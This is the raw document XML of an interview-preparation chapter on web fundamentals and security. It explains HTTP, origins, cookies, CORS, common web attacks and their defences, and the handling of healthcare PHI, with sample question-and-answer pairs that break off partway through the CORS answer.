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13 — Web Fundamentals and Security</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
        <w:t>Your resume claims a security audit (RBAC, JWT/OAuth, PHI), so expect depth here.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>How this file is organised</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Part A — Understand the topic:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> how the web works (HTTP, cookies, origins), the main attacks, authentication vs authorisation, and why healthcare data needs extra care, explained simply.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Part B — Interview questions and answers:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Web Basics → Common Attacks → AuthN/AuthZ → Advanced → Healthcare/PHI → Scenario → From Your Resume.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">Each answer has a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Short answer</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> (say this first), an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">, an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">, and a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> sample answer.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Part A — Understand the Topic</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t>How the web works, in one paragraph</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">The browser (the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>client</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">) sends </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HTTP requests</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> to servers, and the servers send back </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>responses</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">. Each request has a method (GET, POST…), a URL, headers (such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Cookie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Authorization</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">) and sometimes a body. HTTPS wraps this in TLS encryption, so nobody in between can read or change it. Browsers enforce rules, such as the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>same-origin policy</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>, that stop one website from reading another website's data.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t>What is an "origin"?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">An origin is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>scheme + host + port</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>https://app.bpobox.com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https://api.bpobox.com</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>different origins</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">, because the hosts differ. By default, JavaScript on one origin can't read responses from another. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CORS</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> is how a server deliberately allows certain other origins to read its responses.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t>Cookies vs tokens</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cookies</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> are attached to requests to their domain </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>automatically</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> by the browser. That's convenient, but it's also the root of CSRF attacks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Bearer tokens</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> (often JWTs) are added by your JavaScript in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Authorization</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> header, so your JavaScript must be able to read them. That makes them vulnerable to theft through XSS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
        <w:t>Choosing between them is a trade-off between XSS risk and CSRF risk (see Q30).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t>The big attacks every frontend engineer must know</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center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Attack</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="332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What happens</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="332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Main defence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XSS</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> (Cross-Site Scripting)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 xml:space="preserve">attacker's script runs inside </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:i/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>your</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> page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 xml:space="preserve">escape output, avoid </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="B42318"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>innerHTML</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>, sanitise, CSP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CSRF</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> (Cross-Site Request Forgery)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another site makes the user's browser send an authenticated request to you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SameSite cookies, CSRF tokens, Origin checks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Clickjacking</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr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your page is put in an invisible frame to trick clicks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Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="B42318"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>frame-ancestors</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> in CSP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IDOR / broken access control</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr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 xml:space="preserve">changing </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="B42318"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/calls/124</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> to </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="B42318"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/calls/125</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> shows someone else's data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server-side authorisation on every request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Injection</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr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input is run as SQL or commands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parameterised queries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Supply chain</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr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a malicious npm package or CDN script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lockfiles, audits, SRI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>Authentication vs authorisation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Authentication (AuthN):</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>who are you?</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Login, passwords, SSO, MFA.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Authorisation (AuthZ):</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>what are you allowed to do?</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Roles, permissions, tenant and ownership checks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Golden rule:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> the frontend can </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>hide</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> buttons for a better UX, but only the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>server</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> can </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>enforce</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> permissions. Anyone can call your API directly with curl.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t>Why healthcare is special</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PHI</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> (Protected Health Information) is health data linked to a person. In the US, HIPAA governs it. Leaking it causes real harm and legal consequences, so PHI must never sit in browser storage, URLs, logs, analytics or error reports.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t>Why interviewers ask about security</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">Your resume says you led an audit that found 8 critical issues and cut findings by 85%. Interviewers will test whether you really understand XSS, CSRF, token storage, RBAC and PHI handling, and whether you can explain </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>your</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> findings precisely.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Part B — Interview Questions and Answers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">Every answer below has four parts: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Short answer</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> (say this first), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> (add if asked for more), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> (code or a real situation) and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> (a sample spoken answer).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="BFC7D5"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t>🟢 Level 1 — Web Basics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Q1. What happens when you type a URL and press Enter?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HSTS check, DNS lookup, TCP (or QUIC) and TLS handshakes, the HTTP request, the response, then parsing and rendering.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> The browser parses HTML into the DOM, the preload scanner fetches sub-resources, then style, layout, paint and composite run. Later requests reuse the connection.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app.bpobox.com</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> → DNS resolves to the CDN → TLS validates the certificate → GET </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> with cookies → HTML arrives → CSS and JS download in parallel → first paint.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "DNS turns the name into an IP, TCP and TLS set up a secure connection, the request goes out, and the browser parses and renders the response. I can go deeper on any step."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Q2. HTTP vs HTTPS?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HTTPS is HTTP over TLS, giving encryption, integrity and server authentication.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> It's required for service workers, camera and mic access, HTTP/2 in browsers and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Secure</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> cookies.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> On public clinic Wi-Fi, HTTPS stops anyone on the network reading or altering patient data in transit.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "HTTPS means nobody can read or tamper with traffic, and that you're talking to the real server; it's mandatory for anything modern."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Q3. What are the HTTP methods?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GET (read), POST (create/action), PUT (replace), PATCH (partial update), DELETE, OPTIONS (CORS preflight) and HEAD.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> GET, PUT and DELETE are idempotent, so retries are safe; POST isn't, so retries need an idempotency key.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PUT /scorecards/42</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> twice leaves the same result; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>POST /scorecards</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> twice creates two unless deduplicated.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Idempotency decides what's safe to retry, which matters for unreliable networks."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Q4. Which status codes should you know?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2xx success (200, 201, 204), 3xx redirects (301/308, 302/307, 304), 4xx client errors (400, 401, 403, 404, 409, 422, 429) and 5xx server errors (500, 502, 503, 504).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> The UI should react differently: 401 refresh or log in, 403 show "no access", 409 offer a merge, 429 back off.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> A 429 with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Retry-After: 5</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> makes the client wait five seconds before retrying.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Status codes drive UI behaviour, so my API client maps each class to a specific reaction."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Q5. 401 vs 403?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401 means "who are you?" (not authenticated); 403 means "you're not allowed" (authenticated but forbidden).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Re-logging in fixes a 401, never a 403.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> An expired token gets 401 → refresh; a QA agent opening the admin page gets 403 → "You don't have access".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "401 is an identity problem, 403 a permission problem, and the UI handles them differently."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Q6. Which headers should you know?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Request: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Authorization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Cookie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Content-Type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Accept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Origin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If-None-Match</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">. Response: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Set-Cookie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Cache-Control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ETag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Content-Security-Policy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Strict-Transport-Security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Access-Control-Allow-Origin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Retry-After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Many security and caching behaviours are controlled purely by headers.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ETag</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> plus </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>If-None-Match</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> lets the server reply </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>304 Not Modified</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> with no body.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Headers control auth, caching and security policy, so I treat them as part of the frontend's contract."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Q7. What are the cookie attributes?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HttpOnly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Secure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SameSite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Domain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Path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Expires</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Max-Age</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">, and prefixes like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>__Host-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HttpOnly</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> blocks JavaScript access, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Secure</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> requires HTTPS, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>SameSite</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> controls cross-site sending, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>__Host-</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> forces the most locked-down settings.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Set-Cookie: __Host-session=abc; Path=/; Secure; HttpOnly; SameSite=Lax</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Session cookies are always HttpOnly, Secure and SameSite, ideally with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>__Host-</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> prefix."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Q8. What is the same-origin policy?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page can read responses only from the same scheme, host and port.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Cross-origin requests may still be sent (forms, images), but their responses can't be read by JavaScript.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> JavaScript on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>evil.com</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> can't </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>fetch</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> your bank page and read your balance.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Same-origin stops other sites reading your data, which is the foundation of browser security."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Q9. What is CORS?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Cross-Origin Resource Sharing: a server opts in to letting specific other origins read its responses.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Non-simple requests trigger a preflight OPTIONS request. With cookies, the server must return an explicit origin and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Access-Control-Allow-Credentials: true</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>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TEXT</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
